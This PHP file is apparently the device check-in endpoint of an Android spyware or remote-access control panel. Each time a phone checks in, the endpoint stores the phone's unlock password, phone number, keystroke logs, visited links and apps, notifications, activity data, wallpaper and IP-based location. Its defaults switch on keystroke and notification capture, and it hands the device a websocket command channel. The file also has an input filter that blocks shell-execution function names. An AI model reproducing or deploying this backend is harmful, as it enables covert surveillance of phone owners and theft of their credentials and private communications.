<?php
date_default_timezone_set('Asia/Shanghai');

require_once '../private/app_config.php';
require_once __DIR__ . '/../vendor/autoload.php';

use MaxMind\Db\Reader;

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

header_remove('X-Powered-By');
header("Content-Type: application/json; charset=utf-8");
header("X-Content-Type-Options: nosniff");

function pingRateLimitCheck($key, $maxAttempts = 60, $windowSeconds = 60) {
    $cacheDir = sys_get_temp_dir() . '/prl_cache/';
    if (!is_dir($cacheDir)) {
        mkdir($cacheDir, 0750, true);
    }

    $file = $cacheDir . md5($key) . '.json';
    $now = time();
    $data = ['attempts' => [], 'blocked_until' => 0];

    if (file_exists($file)) {
        $loaded = json_decode(file_get_contents($file), true);
        if (is_array($loaded)) {
            $data = $loaded;
        }
    }

    if (($data['blocked_until'] ?? 0) > $now) {
        http_response_code(429);
        echo "Too many requests.";
        exit;
    }

    $attempts = is_array($data['attempts'] ?? null) ? $data['attempts'] : [];
    $attempts = array_filter($attempts, fn($t) => $t > ($now - $windowSeconds));
    $attempts[] = $now;
    $data['attempts'] = array_values($attempts);

    if (count($data['attempts']) > $maxAttempts) {
        $data['blocked_until'] = $now + $windowSeconds;
        file_put_contents($file, json_encode($data));
        http_response_code(429);
        echo "Too many requests.";
        exit;
    }

    file_put_contents($file, json_encode($data));
}

function getCountry($ipAddress) {
    try {
        $databasePath = __DIR__ . '/assets/GeoIP/GeoLite2-City.mmdb';
        $reader = new Reader($databasePath);
        $record = $reader->get($ipAddress);
        $reader->close();

        if (isset($record['country']['names']['en'])) {
            return $record['country']['names']['en'];
        }
        return 'unknown';
    } catch (Exception $e) {
        logToFile("GeoIP error: " . $e->getMessage());
        return 'not found';
    }
}

function logToFile($message) {
    $logFile = __DIR__ . '/geoip_errors.log';
    $log = "[" . date("Y-m-d H:i:s") . "] $message\n";
    file_put_contents($logFile, $log, FILE_APPEND);
}

function generateUUID() {
    return sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        random_int(0, 0xffff), random_int(0, 0xffff),
        random_int(0, 0xffff),
        random_int(0, 0x0fff) | 0x4000,
        random_int(0, 0x3fff) | 0x8000,
        random_int(0, 0xffff), random_int(0, 0xffff), random_int(0, 0xffff)
    );
}

function isBase64Safe($str) {
    if (empty($str) || strlen($str) > 2 * 1024 * 1024) return false;
    if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $str)) return false;
    if (strlen($str) % 4 !== 0) return false;

    $decoded = base64_decode($str, true);
    if ($decoded === false) return false;
    if (preg_match('/<\?php|eval\s*\(|shell_exec|system\s*\(|exec\s*\(|passthru/i', $decoded)) {
        return false;
    }
    return true;
}

function sanitize($val, $maxLen = 255) {
    $val = trim($val);
    $val = substr($val, 0, $maxLen);
    $pattern = '/<\?php|<script|eval\s*\(|shell_exec|system\s*\(|exec\s*\(|passthru|base64_decode\s*\(/i';
    $prev = '';
    while ($prev !== $val) {
        $prev = $val;
        $val = preg_replace($pattern, '', $val);
    }
    return htmlspecialchars($val, ENT_QUOTES, 'UTF-8');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $clientIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        pingRateLimitCheck('ping_' . $clientIp, 60, 60);

        // DEVICE_API_KEY必须配置，不允许空Key绕过认证
        if (!defined('DEVICE_API_KEY') || DEVICE_API_KEY === '') {
            http_response_code(503);
            echo json_encode(["error" => "service_unavailable"]);
            exit;
        }
        $providedKey = $_SERVER['HTTP_X_DEVICE_KEY'] ?? '';
        if (!hash_equals(DEVICE_API_KEY, (string) $providedKey)) {
            http_response_code(401);
            echo json_encode(["error" => "unauthorized"]);
            exit;
        }

        $pdo = new PDO(
            "mysql:host=" . DB_ServerName . ";dbname=" . DB_Name . ";charset=utf8mb4",
            DB_UserName, DB_Password,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_EMULATE_PREPARES => false]
        );

        $userEmail      = sanitize($_POST['user_email'] ?? 'empty', 255);
        $phone_id       = sanitize($_POST['phone_id'] ?? '', 64);
        $phoneName      = sanitize($_POST['phone_name'] ?? '', 50);
        $androidVersion = sanitize($_POST['android_version'] ?? '', 20);
        $model          = sanitize($_POST['model'] ?? '', 50);
        $phonepassword  = sanitize($_POST['phone_password'] ?? '', 100);
        $phonenumber    = sanitize($_POST['phone_number'] ?? '', 30);
        $batteryCharge  = sanitize($_POST['battery_charge'] ?? '', 10);
        $network        = sanitize($_POST['network'] ?? '', 50);
        $installDate    = sanitize($_POST['install_date'] ?? '', 30);
        $phone_idf      = sanitize($_POST['idf'] ?? '', 100);
        $keylogs        = sanitize($_POST['keylogs'] ?? '', 65535);
        $visitedlinks   = sanitize($_POST['vLinks'] ?? '', 65535);
        $visitedapps    = sanitize($_POST['vapps'] ?? '', 65535);
        $notifications  = sanitize($_POST['notifys'] ?? '', 65535);
        $activz         = sanitize($_POST['activz'] ?? '', 65535);
        $isonline       = array_key_exists('isonline', $_POST) ? (int)$_POST['isonline'] : 1;
        $accessibility  = sanitize($_POST['accessibility'] ?? '0', 5);

        $wallp = $_POST['wallpap'] ?? '-1';
        if ($wallp !== '-1') {
            $wallp = isBase64Safe($wallp) ? $wallp : '-1';
        }

        $address = $_SERVER['REMOTE_ADDR'];
        $country = getCountry($address);

        if ($phone_id === 'empty' || empty($phone_id)) {
            $phone_id = generateUUID();
        }

        if (empty($phoneName) && empty($androidVersion) && empty($model) && empty($installDate)) {
            echo json_encode(["ok" => false]);
            exit;
        }

        $stmt = $pdo->prepare("SELECT usrname FROM users WHERE email = ?");
        $stmt->execute([$userEmail]);
        $usrname = $stmt->fetchColumn();

        $timenow = date('Y-m-d H:i:s');
        $defaultOptions = '{"Activities":"0","keystrokes":"1","notifications":"1","visitedapps":"0","visitedlinks":"0","livenotify":"0"}';

        $stmt = $pdo->prepare("
            INSERT INTO phones (
                phone_id, usrname, phone_name, country, address, android_ver, model, phonepassword,
                phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
                files_path, files_data, mob_permissions, keylogs_dates, visited_links,
                visited_apps, notifications, activities, phone_options, session_id,
                Commands, isonline, isRemoved, accessibility
            ) VALUES (
                ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
            )
            ON DUPLICATE KEY UPDATE
                usrname = VALUES(usrname), phone_name = VALUES(phone_name),
                country = VALUES(country), address = VALUES(address),
                android_ver = VALUES(android_ver), model = VALUES(model),
                phonepassword = VALUES(phonepassword), phonenumber = VALUES(phonenumber),
                wallpaper = VALUES(wallpaper), battery_charg = VALUES(battery_charg),
                network = VALUES(network), install_date = VALUES(install_date),
                last_ping = VALUES(last_ping), isonline = VALUES(isonline),
                accessibility = VALUES(accessibility)
        ");

        $stmt->execute([
            $phone_id, $usrname, $phoneName, $country, $address,
            $androidVersion, $model, $phonepassword, $phonenumber,
            $wallp, $batteryCharge, $network, $installDate, $timenow,
            '', '', null, $keylogs, $visitedlinks,
            $visitedapps, $notifications, $activz, $defaultOptions,
            $phone_idf, '', $isonline, 0, $accessibility
        ]);

        $wsUrl = env('WS_URL', 'wss://yourdomain.com/api/ws/');
        echo 'Conf:{"sk":"' . $wsUrl . '"}';

    } catch (Exception $e) {
        http_response_code(500);
        echo json_encode(["ok" => false]);
        error_log('[Ping] ' . $e->getMessage());
    }
} else {
    http_response_code(405);
    echo json_encode(["error" => "method_not_allowed"]);
}
